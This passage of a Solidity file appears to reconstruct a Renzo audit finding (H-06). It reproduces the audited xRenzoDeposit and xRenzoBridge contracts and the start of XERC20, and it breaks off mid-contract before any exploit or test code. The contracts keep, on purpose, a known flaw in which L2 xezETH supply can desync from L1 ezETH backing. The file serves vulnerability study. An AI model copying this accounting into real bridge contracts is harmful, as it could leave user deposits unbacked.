// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// =============================================================================
// AuditVault #33493 [H-06] - Renzo: xezETH supply desyncs from ezETH backing.
//
// Single-file, forge-std-free, cheatcode-free Playground reconstruction.
// The two vulnerable audited contracts (xRenzoDeposit - L2, xRenzoBridge - L1)
// are pasted VERBATIM below from 2024-04-renzo @ commit b5b5b76 so the Playground
// shows their REAL source. Every supporting protocol contract on the exploit
// path (XERC20 receipt token, XERC20Lockbox, RenzoOracle mint-rate math) is the
// real audited source too. The ONLY mock is the opaque cross-chain messenger
// (Connext); it carries NONE of the vulnerable accounting.
// =============================================================================

import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {ReentrancyGuardUpgradeable} from "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";
import {IERC20MetadataUpgradeable} from "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/IERC20MetadataUpgradeable.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {ERC20Upgradeable} from "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import {ERC20PermitUpgradeable} from "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20PermitUpgradeable.sol";
import {Client} from "@chainlink/contracts-ccip/src/v0.8/ccip/libraries/Client.sol";
import {IRouterClient} from "@chainlink/contracts-ccip/src/v0.8/ccip/interfaces/IRouterClient.sol";
import {LinkTokenInterface} from "@chainlink/contracts/src/v0.8/shared/interfaces/LinkTokenInterface.sol";

import "../src/selected/Errors/Errors.sol";
import "../src/selected/Bridge/L2/xRenzoDepositStorage.sol";
import "../src/selected/Bridge/L1/xRenzoBridgeStorage.sol";
import {IXReceiver} from "../src/selected/Bridge/Connext/core/IXReceiver.sol";
import {IWeth} from "../src/selected/Bridge/Connext/core/IWeth.sol";
import {IConnext} from "../src/selected/Bridge/Connext/core/IConnext.sol";
import {IRenzoOracleL2} from "../src/selected/Bridge/L2/Oracle/IRenzoOracleL2.sol";
import {IRestakeManager} from "../src/selected/IRestakeManager.sol";
import {IXERC20} from "../src/selected/Bridge/xERC20/interfaces/IXERC20.sol";
import {IXERC20Lockbox} from "../src/selected/Bridge/xERC20/interfaces/IXERC20Lockbox.sol";
import {IRateProvider} from "../src/selected/RateProvider/IRateProvider.sol";
import {IRoleManager} from "../src/selected/Permissions/IRoleManager.sol";

// ============================ REAL AUDITED SOURCE ============================
// contracts/Bridge/L2/xRenzoDeposit.sol (verbatim body)

/**
 * @author  Renzo
 * @title   xRenzoDeposit Contract
 * @dev     Tokens are sent to this contract via deposit, xezETH is minted for the user,
 *          and funds are batched and bridged down to the L1 for depositing into the Renzo Protocol.
 *          Any ezETH minted on the L1 will be locked in the lockbox for unwrapping at a later time with xezETH.
 * @notice  Allows L2 minting of xezETH tokens in exchange for deposited assets
 */

contract xRenzoDeposit is
    Initializable,
    OwnableUpgradeable,
    ReentrancyGuardUpgradeable,
    IRateProvider,
    xRenzoDepositStorageV3
{
    using SafeERC20 for IERC20;

    /// @dev - This contract expects all tokens to have 18 decimals for pricing
    uint8 public constant EXPECTED_DECIMALS = 18;

    /// @dev - Fee basis point, 100 basis point = 1 %
    uint32 public constant FEE_BASIS = 10000;

    event PriceUpdated(uint256 price, uint256 timestamp);
    event Deposit(address indexed user, uint256 amountIn, uint256 amountOut);
    event BridgeSweeperAddressUpdated(address sweeper, bool allowed);
    event BridgeSwept(
        uint32 destinationDomain,
        address destinationTarget,
        address delegate,
        uint256 amount
    );
    event OraclePriceFeedUpdated(address newOracle, address oldOracle);
    event ReceiverPriceFeedUpdated(address newReceiver, address oldReceiver);
    event SweeperBridgeFeeCollected(address sweeper, uint256 feeCollected);
    event BridgeFeeShareUpdated(uint256 oldBridgeFeeShare, uint256 newBridgeFeeShare);
    event SweepBatchSizeUpdated(uint256 oldSweepBatchSize, uint256 newSweepBatchSize);

    /// @dev Prevents implementation contract from being initialized.
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    /**
     * @notice  Initializes the contract with initial vars
     * @dev     All tokens are expected to have 18 decimals
     * @param   _currentPrice  Initializes it with an initial price of ezETH to ETH
     * @param   _xezETH  L2 ezETH token
     * @param   _depositToken  WETH on L2
     * @param   _collateralToken  nextWETH on L2
     * @param   _connext  Connext contract
     * @param   _swapKey  Swap key for the connext contract swap from WETH to nextWETH
     * @param   _receiver Renzo Receiver middleware contract for price feed
     * @param   _oracle Price feed oracle for ezETH
     */
    function initialize(
        uint256 _currentPrice,
        IERC20 _xezETH,
        IERC20 _depositToken,
        IERC20 _collateralToken,
        IConnext _connext,
        bytes32 _swapKey,
        address _receiver,
        uint32 _bridgeDestinationDomain,
        address _bridgeTargetAddress,
        IRenzoOracleL2 _oracle
    ) public initializer {
        // Initialize inherited classes
        __Ownable_init();

        // Verify valid non zero values
        if (
            _currentPrice == 0 ||
            address(_xezETH) == address(0) ||
            address(_depositToken) == address(0) ||
            address(_collateralToken) == address(0) ||
            address(_connext) == address(0) ||
            _swapKey == 0 ||
            _bridgeDestinationDomain == 0 ||
            _bridgeTargetAddress == address(0)
        ) {
            revert InvalidZeroInput();
        }

        // Verify all tokens have 18 decimals
        uint8 decimals = IERC20MetadataUpgradeable(address(_depositToken)).decimals();
        if (decimals != EXPECTED_DECIMALS) {
            revert InvalidTokenDecimals(EXPECTED_DECIMALS, decimals);
        }
        decimals = IERC20MetadataUpgradeable(address(_collateralToken)).decimals();
        if (decimals != EXPECTED_DECIMALS) {
            revert InvalidTokenDecimals(EXPECTED_DECIMALS, decimals);
        }
        decimals = IERC20MetadataUpgradeable(address(_xezETH)).decimals();
        if (decimals != EXPECTED_DECIMALS) {
            revert InvalidTokenDecimals(EXPECTED_DECIMALS, decimals);
        }

        // Initialize the price and timestamp
        lastPrice = _currentPrice;
        lastPriceTimestamp = block.timestamp;

        // Set xezETH address
        xezETH = _xezETH;

        // Set the depoist token
        depositToken = _depositToken;

        // Set the collateral token
        collateralToken = _collateralToken;

        // Set the connext contract
        connext = _connext;

        // Set the swap key
        swapKey = _swapKey;

        // Set receiver contract address
        receiver = _receiver;
        // Connext router fee is 5 basis points
        bridgeRouterFeeBps = 5;

        // Set the bridge destination domain
        bridgeDestinationDomain = _bridgeDestinationDomain;

        // Set the bridge target address
        bridgeTargetAddress = _bridgeTargetAddress;

        // set oracle Price Feed struct
        oracle = _oracle;

        // set bridge Fee Share 0.05% where 100 basis point = 1%
        bridgeFeeShare = 5;

        //set sweep batch size to 32 ETH
        sweepBatchSize = 32 ether;
    }

    /**
     * @notice  Accepts deposit for the user in the native asset and mints xezETH
     * @dev     This funcion allows anyone to call and deposit the native asset for xezETH
     *          The native asset will be wrapped to WETH (if it is supported)
     *          ezETH will be immediately minted based on the current price
     *          Funds will be held until sweep() is called.
     * @param   _minOut  Minimum number of xezETH to accept to ensure slippage minimums
     * @param   _deadline  latest timestamp to accept this transaction
     * @return  uint256  Amount of xezETH minted to calling account
     */
    function depositETH(
        uint256 _minOut,
        uint256 _deadline
    ) external payable nonReentrant returns (uint256) {
        if (msg.value == 0) {
            revert InvalidZeroInput();
        }

        // Get the deposit token balance before
        uint256 depositBalanceBefore = depositToken.balanceOf(address(this));

        // Wrap the deposit ETH to WETH
        IWeth(address(depositToken)).deposit{ value: msg.value }();

        // Get the amount of tokens that were wrapped
        uint256 wrappedAmount = depositToken.balanceOf(address(this)) - depositBalanceBefore;

        // Sanity check for 0
        if (wrappedAmount == 0) {
            revert InvalidZeroOutput();
        }

        return _deposit(wrappedAmount, _minOut, _deadline);
    }

    /**
     * @notice  Accepts deposit for the user in depositToken and mints xezETH
     * @dev     This funcion allows anyone to call and deposit collateral for xezETH
     *          ezETH will be immediately minted based on the current price
     *          Funds will be held until sweep() is called.
     *          User calling this function should first approve the tokens to be pulled via transferFrom
     * @param   _amountIn  Amount of tokens to deposit
     * @param   _minOut  Minimum number of xezETH to accept to ensure slippage minimums
     * @param   _deadline  latest timestamp to accept this transaction
     * @return  uint256  Amount of xezETH minted to calling account
     */
    function deposit(
        uint256 _amountIn,
        uint256 _minOut,
        uint256 _deadline
    ) external nonReentrant returns (uint256) {
        if (_amountIn == 0) {
            revert InvalidZeroInput();
        }

        // Transfer deposit tokens from user to this contract
        depositToken.safeTransferFrom(msg.sender, address(this), _amountIn);

        return _deposit(_amountIn, _minOut, _deadline);
    }

    /**
     * @notice  Internal function to trade deposit tokens for nextWETH and mint xezETH
     * @dev     Deposit Tokens should be available in the contract before calling this function
     * @param   _amountIn  Amount of tokens deposited
     * @param   _minOut  Minimum number of xezETH to accept to ensure slippage minimums
     * @param   _deadline  latest timestamp to accept this transaction
     * @return  uint256  Amount of xezETH minted to calling account
     */
    function _deposit(
        uint256 _amountIn,
        uint256 _minOut,
        uint256 _deadline
    ) internal returns (uint256) {
        // calculate bridgeFee for deposit amount
        uint256 bridgeFee = getBridgeFeeShare(_amountIn);
        // subtract from _amountIn and add to bridgeFeeCollected
        _amountIn -= bridgeFee;
        bridgeFeeCollected += bridgeFee;

        // Trade deposit tokens for nextWETH
        uint256 amountOut = _trade(_amountIn, _deadline);
        if (amountOut == 0) {
            revert InvalidZeroOutput();
        }

        // Fetch price and timestamp of ezETH from the configured price feed
        (uint256 _lastPrice, uint256 _lastPriceTimestamp) = getMintRate();

        // Verify the price is not stale
        if (block.timestamp > _lastPriceTimestamp + 1 days) {
            revert OraclePriceExpired();
        }

        // Calculate the amount of xezETH to mint - assumes 18 decimals for price and token
        uint256 xezETHAmount = (1e18 * amountOut) / _lastPrice;

        // Check that the user will get the minimum amount of xezETH
        if (xezETHAmount < _minOut) {
            revert InsufficientOutputAmount();
        }

        // Verify the deadline has not passed
        if (block.timestamp > _deadline) {
            revert InvalidTimestamp(_deadline);
        }

        // Mint xezETH to the user
        IXERC20(address(xezETH)).mint(msg.sender, xezETHAmount);

        // Emit the event and return amount minted
        emit Deposit(msg.sender, _amountIn, xezETHAmount);
        return xezETHAmount;
    }

    /**
     * @notice Function returns bridge fee share for deposit
     * @param _amountIn deposit amount in terms of ETH
     */
    function getBridgeFeeShare(uint256 _amountIn) public view returns (uint256) {
        // deduct bridge Fee share
        if (_amountIn < sweepBatchSize) {
            return (_amountIn * bridgeFeeShare) / FEE_BASIS;
        } else {
            return (sweepBatchSize * bridgeFeeShare) / FEE_BASIS;
        }
    }

    /**
     * @notice Fetch the price of ezETH from configured price feeds
     */
    function getMintRate() public view returns (uint256, uint256) {
        // revert if PriceFeedNotAvailable
        if (receiver == address(0) && address(oracle) == address(0)) revert PriceFeedNotAvailable();
        if (address(oracle) != address(0)) {
            (uint256 oraclePrice, uint256 oracleTimestamp) = oracle.getMintRate();
            return
                oracleTimestamp > lastPriceTimestamp
                    ? (oraclePrice, oracleTimestamp)
                    : (lastPrice, lastPriceTimestamp);
        } else {
            return (lastPrice, lastPriceTimestamp);
        }
    }

    /**
     * @notice  Updates the price feed
     * @dev     This function will receive the price feed and timestamp from the L1 through CCIPReceiver middleware contract.
     *          It should verify the origin of the call and only allow permissioned source to call.
     * @param   _price The price of ezETH sent via L1.
     * @param   _timestamp The timestamp at which L1 sent the price.
     */
    function updatePrice(uint256 _price, uint256 _timestamp) external override {
        if (msg.sender != receiver) revert InvalidSender(receiver, msg.sender);
        _updatePrice(_price, _timestamp);
    }

    /**
     * @notice  Updates the price feed from the Owner account
     * @dev     Sets the last price and timestamp
     * @param   price  price of ezETH to ETH - 18 decimal precision
     */
    function updatePriceByOwner(uint256 price) external onlyOwner {
        return _updatePrice(price, block.timestamp);
    }

    /**
     * @notice  Internal function to update price
     * @dev     Sanity checks input values and updates prices
     * @param   _price  Current price of ezETH to ETH - 18 decimal precision
     * @param   _timestamp  The timestamp of the price update
     */
    function _updatePrice(uint256 _price, uint256 _timestamp) internal {
        // Check for 0
        if (_price == 0) {
            revert InvalidZeroInput();
        }

        // Check for price divergence - more than 10%
        if (
            (_price > lastPrice && (_price - lastPrice) > (lastPrice / 10)) ||
            (_price < lastPrice && (lastPrice - _price) > (lastPrice / 10))
        ) {
            revert InvalidOraclePrice();
        }

        // Do not allow older price timestamps
        if (_timestamp <= lastPriceTimestamp) {
            revert InvalidTimestamp(_timestamp);
        }

        // Do not allow future timestamps
        if (_timestamp > block.timestamp) {
            revert InvalidTimestamp(_timestamp);
        }

        // Update values and emit event
        lastPrice = _price;
        lastPriceTimestamp = _timestamp;

        emit PriceUpdated(_price, _timestamp);
    }

    /**
     * @notice  Trades deposit asset for nextWETH
     * @dev     Note that min out is not enforced here since the asset will be priced to ezETH by the calling function
     * @param   _amountIn  Amount of deposit tokens to trade for collateral asset
     * @return  _deadline Deadline for the trade to prevent stale requests
     */
    function _trade(uint256 _amountIn, uint256 _deadline) internal returns (uint256) {
        // Approve the deposit asset to the connext contract
        depositToken.safeApprove(address(connext), _amountIn);

        // We will accept any amount of tokens out here... The caller of this function should verify the amount meets minimums
        uint256 minOut = 0;

        // Swap the tokens
        uint256 amountNextWETH = connext.swapExact(
            swapKey,
            _amountIn,
            address(depositToken),
            address(collateralToken),
            minOut,
            _deadline
        );

        // Subtract the bridge router fee
        if (bridgeRouterFeeBps > 0) {
            uint256 fee = (amountNextWETH * bridgeRouterFeeBps) / 10_000;
            amountNextWETH -= fee;
        }

        return amountNextWETH;
    }

    /**
     * @notice This function transfer the bridge fee to sweeper address
     */
    function _recoverBridgeFee() internal {
        uint256 feeCollected = bridgeFeeCollected;
        bridgeFeeCollected = 0;
        // transfer collected fee to bridgeSweeper
        uint256 balanceBefore = address(this).balance;
        IWeth(address(depositToken)).withdraw(feeCollected);
        feeCollected = address(this).balance - balanceBefore;
        (bool success, ) = payable(msg.sender).call{ value: feeCollected }("");
        if (!success) revert TransferFailed();
        emit SweeperBridgeFeeCollected(msg.sender, feeCollected);
    }

    /**
     * @notice  This function will take the balance of nextWETH in the contract and bridge it down to the L1
     * @dev     The L1 contract will unwrap, deposit in Renzo, and lock up the ezETH in the lockbox on L1
     *          This function should only be callable by permissioned accounts
     *          The caller will estimate and pay the gas for the bridge call
     */
    function sweep() public payable nonReentrant {
        // Verify the caller is whitelisted
        if (!allowedBridgeSweepers[msg.sender]) {
            revert UnauthorizedBridgeSweeper();
        }

        // Get the balance of nextWETH in the contract
        uint256 balance = collateralToken.balanceOf(address(this));

        // If there is no balance, return
        if (balance == 0) {
            revert InvalidZeroOutput();
        }

        // Approve it to the connext contract
        collateralToken.safeApprove(address(connext), balance);

        // Need to send some calldata so it triggers xReceive on the target
        bytes memory bridgeCallData = abi.encode(balance);

        connext.xcall{ value: msg.value }(
            bridgeDestinationDomain,
            bridgeTargetAddress,
            address(collateralToken),
            msg.sender,
            balance,
            0, // Asset is already nextWETH, so no slippage will be incurred
            bridgeCallData
        );

        // send collected bridge fee to sweeper
        _recoverBridgeFee();

        // Emit the event
        emit BridgeSwept(bridgeDestinationDomain, bridgeTargetAddress, msg.sender, balance);
    }

    /**
     * @notice  Exposes the price via getRate()
     * @dev     This is required for a balancer pool to get the price of ezETH
     * @return  uint256  .
     */
    function getRate() external view override returns (uint256) {
        return lastPrice;
    }

    /**
     * @notice  Allows the owner to set addresses that are allowed to call the bridge() function
     * @dev     .
     * @param   _sweeper  Address of the proposed sweeping account
     * @param   _allowed  bool to allow or disallow the address
     */
    function setAllowedBridgeSweeper(address _sweeper, bool _allowed) external onlyOwner {
        allowedBridgeSweepers[_sweeper] = _allowed;

        emit BridgeSweeperAddressUpdated(_sweeper, _allowed);
    }

    /**
     * @notice  Sweeps accidental ETH value sent to the contract
     * @dev     Restricted to be called by the Owner only.
     * @param   _amount  amount of native asset
     * @param   _to  destination address
     */
    function recoverNative(uint256 _amount, address _to) external onlyOwner {
        payable(_to).transfer(_amount);
    }

    /**
     * @notice  Sweeps accidental ERC20 value sent to the contract
     * @dev     Restricted to be called by the Owner only.
     * @param   _token  address of the ERC20 token
     * @param   _amount  amount of ERC20 token
     * @param   _to  destination address
     */
    function recoverERC20(address _token, uint256 _amount, address _to) external onlyOwner {
        IERC20(_token).safeTransfer(_to, _amount);
    }

    /******************************
     *  Admin/OnlyOwner functions
     *****************************/
    /**
     * @notice This function sets/updates the Oracle price Feed middleware for ezETH
     * @dev This should be permissioned call (onlyOwner), can be set to address(0) for not configured
     * @param _oracle Oracle address
     */
    function setOraclePriceFeed(IRenzoOracleL2 _oracle) external onlyOwner {
        emit OraclePriceFeedUpdated(address(_oracle), address(oracle));
        oracle = _oracle;
    }

    /**
     * @notice This function sets/updates the Receiver Price Feed Middleware for ezETH
     * @dev This should be permissioned call (onlyOnwer), can be set to address(0) for not configured
     * @param _receiver Receiver address
     */
    function setReceiverPriceFeed(address _receiver) external onlyOwner {
        emit ReceiverPriceFeedUpdated(_receiver, receiver);
        receiver = _receiver;
    }

    /**
     * @notice This function updates the BridgeFeeShare for depositors (must be <= 1% i.e. 100 bps)
     * @dev This should be a permissioned call (onlyOnwer)
     * @param _newShare new Bridge fee share in basis points where 100 basis points = 1%
     */
    function updateBridgeFeeShare(uint256 _newShare) external onlyOwner {
        if (_newShare > 100) revert InvalidBridgeFeeShare(_newShare);
        emit BridgeFeeShareUpdated(bridgeFeeShare, _newShare);
        bridgeFeeShare = _newShare;
    }

    /**
     * @notice This function updates the Sweep Batch Size (must be >= 32 ETH)
     * @dev This should be a permissioned call (onlyOwner)
     * @param _newBatchSize new batch size for sweeping
     */
    function updateSweepBatchSize(uint256 _newBatchSize) external onlyOwner {
        if (_newBatchSize < 32 ether) revert InvalidSweepBatchSize(_newBatchSize);
        emit SweepBatchSizeUpdated(sweepBatchSize, _newBatchSize);
        sweepBatchSize = _newBatchSize;
    }

    /**
     * @notice Fallback function to handle ETH sent to the contract from unwrapping WETH
     * @dev Warning: users should not send ETH directly to this contract!
     */
    receive() external payable {}
}

// ============================ REAL AUDITED SOURCE ============================
// contracts/Bridge/L1/xRenzoBridge.sol (verbatim body)

contract xRenzoBridge is
    IXReceiver,
    Initializable,
    ReentrancyGuardUpgradeable,
    xRenzoBridgeStorageV1
{
    using SafeERC20 for IERC20;

    /// @dev Event emitted when bridge triggers ezETH mint
    event EzETHMinted(
        bytes32 transferId,
        uint256 amountDeposited,
        uint32 origin,
        address originSender,
        uint256 ezETHMinted
    );

    /// @dev Event emitted when a message is sent to another chain.
    event MessageSent(
        bytes32 indexed messageId, // The unique ID of the CCIP message.
        uint64 indexed destinationChainSelector, // The chain selector of the destination chain.
        address receiver, // The address of the receiver on the destination chain.
        uint256 exchangeRate, // The exchange rate sent.
        address feeToken, // the token address used to pay CCIP fees.
        uint256 fees // The fees paid for sending the CCIP message.
    );

    event ConnextMessageSent(
        uint32 indexed destinationChainDomain, // The chain domain Id of the destination chain.
        address receiver, // The address of the receiver on the destination chain.
        uint256 exchangeRate, // The exchange rate sent.
        uint256 fees // The fees paid for sending the Connext message.
    );

    modifier onlyBridgeAdmin() {
        if (!roleManager.isBridgeAdmin(msg.sender)) revert NotBridgeAdmin();
        _;
    }

    modifier onlyPriceFeedSender() {
        if (!roleManager.isPriceFeedSender(msg.sender)) revert NotPriceFeedSender();
        _;
    }

    /// @dev - This contract expects all tokens to have 18 decimals for pricing
    uint8 public constant EXPECTED_DECIMALS = 18;

    /// @dev Prevents implementation contract from being initialized.
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    /// @dev Initializes the contract with initial vars
    function initialize(
        IERC20 _ezETH,
        IERC20 _xezETH,
        IRestakeManager _restakeManager,
        IERC20 _wETH,
        IXERC20Lockbox _xezETHLockbox,
        IConnext _connext,
        IRouterClient _linkRouterClient,
        IRateProvider _rateProvider,
        LinkTokenInterface _linkToken,
        IRoleManager _roleManager
    ) public initializer {
        // Verify non-zero addresses on inputs
        if (
            address(_ezETH) == address(0) ||
            address(_xezETH) == address(0) ||
            address(_restakeManager) == address(0) ||
            address(_wETH) == address(0) ||
            address(_xezETHLockbox) == address(0) ||
            address(_connext) == address(0) ||
            address(_linkRouterClient) == address(0) ||
            address(_rateProvider) == address(0) ||
            address(_linkToken) == address(0) ||
            address(_roleManager) == address(0)
        ) {
            revert InvalidZeroInput();
        }

        // Verify all tokens have 18 decimals
        uint8 decimals = IERC20MetadataUpgradeable(address(_ezETH)).decimals();
        if (decimals != EXPECTED_DECIMALS) {
            revert InvalidTokenDecimals(EXPECTED_DECIMALS, decimals);
        }
        decimals = IERC20MetadataUpgradeable(address(_xezETH)).decimals();
        if (decimals != EXPECTED_DECIMALS) {
            revert InvalidTokenDecimals(EXPECTED_DECIMALS, decimals);
        }
        decimals = IERC20MetadataUpgradeable(address(_wETH)).decimals();
        if (decimals != EXPECTED_DECIMALS) {
            revert InvalidTokenDecimals(EXPECTED_DECIMALS, decimals);
        }
        decimals = IERC20MetadataUpgradeable(address(_linkToken)).decimals();
        if (decimals != EXPECTED_DECIMALS) {
            revert InvalidTokenDecimals(EXPECTED_DECIMALS, decimals);
        }

        // Save off inputs
        ezETH = _ezETH;
        xezETH = _xezETH;
        restakeManager = _restakeManager;
        wETH = _wETH;
        xezETHLockbox = _xezETHLockbox;
        connext = _connext;
        linkRouterClient = _linkRouterClient;
        rateProvider = _rateProvider;
        linkToken = _linkToken;
        roleManager = _roleManager;
    }

    /**
     * @notice  Accepts collateral from the bridge
     * @dev     This function will take all collateral and deposit it into Renzo
     *          The ezETH from the deposit will be sent to the lockbox to be wrapped into xezETH
     *          The xezETH will be burned so that the xezETH on the L2 can be unwrapped for ezETH later
     * @notice  WARNING: This function does NOT whitelist who can send funds from the L2 via Connext.  Users should NOT
     *          send funds directly to this contract.  A user who sends funds directly to this contract will cause
     *          the tokens on the L2 to become over collateralized and will be a "donation" to protocol.  Only use
     *          the deposit contracts on the L2 to send funds to this contract.
     */
    function xReceive(
        bytes32 _transferId,
        uint256 _amount,
        address _asset,
        address _originSender,
        uint32 _origin,
        bytes memory
    ) external nonReentrant returns (bytes memory) {
        // Only allow incoming messages from the Connext contract
        if (msg.sender != address(connext)) {
            revert InvalidSender(address(connext), msg.sender);
        }

        // Check that the token received is wETH
        if (_asset != address(wETH)) {
            revert InvalidTokenReceived();
        }

        // Check that the amount sent is greater than 0
        if (_amount == 0) {
            revert InvalidZeroInput();
        }

        // Get the balance of ETH before the withdraw
        uint256 ethBalanceBeforeWithdraw = address(this).balance;

        // Unwrap the WETH
        IWeth(address(wETH)).withdraw(_amount);

        // Get the amount of ETH
        uint256 ethAmount = address(this).balance - ethBalanceBeforeWithdraw;

        // Get the amonut of ezETH before the deposit
        uint256 ezETHBalanceBeforeDeposit = ezETH.balanceOf(address(this));

        // Deposit it into Renzo RestakeManager
        restakeManager.depositETH{ value: ethAmount }();

        // Get the amount of ezETH that was minted
        uint256 ezETHAmount = ezETH.balanceOf(address(this)) - ezETHBalanceBeforeDeposit;

        // Approve the lockbox to spend the ezETH
        ezETH.safeApprove(address(xezETHLockbox), ezETHAmount);

        // Get the xezETH balance before the deposit
        uint256 xezETHBalanceBeforeDeposit = xezETH.balanceOf(address(this));

        // Send to the lockbox to be wrapped into xezETH
        xezETHLockbox.deposit(ezETHAmount);

        // Get the amount of xezETH that was minted
        uint256 xezETHAmount = xezETH.balanceOf(address(this)) - xezETHBalanceBeforeDeposit;

        // Burn it - it was already minted on the L2
        IXERC20(address(xezETH)).burn(address(this), xezETHAmount);

        // Emit the event
        emit EzETHMinted(_transferId, _amount, _origin, _originSender, ezETHAmount);

        // Return 0 for success
        bytes memory returnData = new bytes(0);
        return returnData;
    }

    /**
     * @notice  Send the price feed to the L1
     * @dev     Calls the getRate() function to get the current ezETH to ETH price and sends to the L2.
     *          This should be a permissioned call for only PRICE_FEED_SENDER role
     * @param _destinationParam array of CCIP destination chain param
     * @param _connextDestinationParam array of connext destination chain param
     */
    function sendPrice(
        CCIPDestinationParam[] calldata _destinationParam,
        ConnextDestinationParam[] calldata _connextDestinationParam
    ) external payable onlyPriceFeedSender nonReentrant {
        // call getRate() to get the current price of ezETH
        uint256 exchangeRate = rateProvider.getRate();
        bytes memory _callData = abi.encode(exchangeRate, block.timestamp);
        // send price feed to renzo CCIP receivers
        for (uint256 i = 0; i < _destinationParam.length; ) {
            Client.EVM2AnyMessage memory evm2AnyMessage = Client.EVM2AnyMessage({
                receiver: abi.encode(_destinationParam[i]._renzoReceiver), // ABI-encoded xRenzoDepsot contract address
                data: _callData, // ABI-encoded ezETH exchange rate with Timestamp
                tokenAmounts: new Client.EVMTokenAmount[](0), // Empty array indicating no tokens are being sent
                extraArgs: Client._argsToBytes(
                    // Additional arguments, setting gas limit
                    Client.EVMExtraArgsV1({ gasLimit: 200_000 })
                ),
                // Set the feeToken  address, indicating LINK will be used for fees
                feeToken: address(linkToken)
            });

            // Get the fee required to send the message
            uint256 fees = linkRouterClient.getFee(
                _destinationParam[i].destinationChainSelector,
                evm2AnyMessage
            );

            if (fees > linkToken.balanceOf(address(this)))
                revert NotEnoughBalance(linkToken.balanceOf(address(this)), fees);

            // approve the Router to transfer LINK tokens on contract's behalf. It will spend the fees in LINK
            linkToken.approve(address(linkRouterClient), fees);

            // Send the message through the router and store the returned message ID
            bytes32 messageId = linkRouterClient.ccipSend(
                _destinationParam[i].destinationChainSelector,
                evm2AnyMessage
            );

            // Emit an event with message details
            emit MessageSent(
                messageId,
                _destinationParam[i].destinationChainSelector,
                _destinationParam[i]._renzoReceiver,
                exchangeRate,
                address(linkToken),
                fees
            );
            unchecked {
                ++i;
            }
        }

        // send price feed to renzo connext receiver
        for (uint256 i = 0; i < _connextDestinationParam.length; ) {
            connext.xcall{ value: _connextDestinationParam[i].relayerFee }(
                _connextDestinationParam[i].destinationDomainId,
                _connextDestinationParam[i]._renzoReceiver,
                address(0),
                msg.sender,
                0,
                0,
                _callData
            );

            emit ConnextMessageSent(
                _connextDestinationParam[i].destinationDomainId,
                _connextDestinationParam[i]._renzoReceiver,
                exchangeRate,
                _connextDestinationParam[i].relayerFee
            );

            unchecked {
                ++i;
            }
        }
    }

    /**
     * @notice  Sweeps accidental ETH value sent to the contract
     * @dev     Restricted to be called by the bridge admin only.
     * @param   _amount  amount of native asset
     * @param   _to  destination address
     */
    function recoverNative(uint256 _amount, address _to) external onlyBridgeAdmin {
        payable(_to).transfer(_amount);
    }

    /**
     * @notice  Sweeps accidental ERC20 value sent to the contract
     * @dev     Restricted to be called by the bridge admin only.
     * @param   _token  address of the ERC20 token
     * @param   _amount  amount of ERC20 token
     * @param   _to  destination address
     */
    function recoverERC20(address _token, uint256 _amount, address _to) external onlyBridgeAdmin {
        IERC20(_token).safeTransfer(_to, _amount);
    }

    /**
     * @notice Fallback function to handle ETH sent to the contract from unwrapping WETH
     * @dev Warning: users should not send ETH directly to this contract!
     */
    receive() external payable {}
}

// ============================ REAL AUDITED SOURCE ============================
// contracts/Bridge/xERC20/contracts/XERC20.sol (verbatim body)

contract XERC20 is
    Initializable,
    ERC20Upgradeable,
    OwnableUpgradeable,
    IXERC20,
    ERC20PermitUpgradeable
{
    /**
     * @notice The duration it takes for the limits to fully replenish
     */
    uint256 private constant _DURATION = 1 days;

    /**
     * @notice The address of the factory which deployed this contract
     */
    address public FACTORY;

    /**
     * @notice The address of the lockbox contract
     */
    address public lockbox;

    /**
     * @notice Maps bridge address to bridge configurations
     */
    mapping(address => Bridge) public bridges;

    // constructor(string memory _name, string memory _symbol, address _factory) ERC20Upgradeable(_name, _symbol) ERC20PermitUpgradeable(_name) {
    //   _transferOwnership(_factory);
    //   FACTORY = _factory;
    // }

    /// @dev Prevents implementation contract from being initialized.
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    /**
     * @notice Constructs the initial config of the XERC20
     *
     * @param _name The name of the token
     * @param _symbol The symbol of the token
     * @param _factory The factory which deployed this contract
     */
    function initialize(
        string memory _name,
        string memory _symbol,
        address _factory
    ) public initializer {
        __XERC20_init(_name, _symbol, _factory);
    }

    /**
     * @notice Constructs the initial config of the XERC20
     *
     * @param _name The name of the token
     * @param _symbol The symbol of the token
     * @param _factory The factory which deployed this contract
     */
    function __XERC20_init(
        string memory _name,
        string memory _symbol,
        address _factory
    ) internal onlyInitializing {
        __ERC20_init(_name, _symbol);
        __ERC20Permit_init(_name);
        __Ownable_init();

        _transferOwnership(_factory);
        FACTORY = _factory;
    }

    /**
     * @notice Mints tokens for a user
     * @dev Can only be called by a bridge
     * @param _user The address of the user who needs tokens minted
     * @param _amount The amount of tokens being minted
     */

    function mint(address _user, uint256 _amount) public virtual {
        _mintWithCaller(msg.sender, _user, _amount);
    }

    /**
     * @notice Burns tokens for a user
     * @dev Can only be called by a bridge
     * @param _user The address of the user who needs tokens burned
     * @param _amount The amount of tokens being burned
     */

    function burn(address _user, uint256 _amount) public virtual {
        if (msg.sender != _user) {
            _spendAllowance(_user, msg.sender, _amount);
        }

        _burnWithCaller(msg.sender, _user, _amount);
    }

    /**
     * @notice Sets the lockbox address
     *
     * @param _lockbox The address of the lockbox
     */

    function setLockbox(address _lockbox) public {
        if (msg.sender != FACTORY) revert IXERC20_NotFactory();
        lockbox = _lockbox;

        emit LockboxSet(_lockbox);
    }

    /**
     * @notice Updates the limits of any bridge
     * @dev Can only be called by the owner
     * @param _mintingLimit The updated minting limit we are setting to the bridge
     * @param _burningLimit The updated burning limit we are setting to the bridge
     * @param _bridge The address of the bridge we are setting the limits too
     */
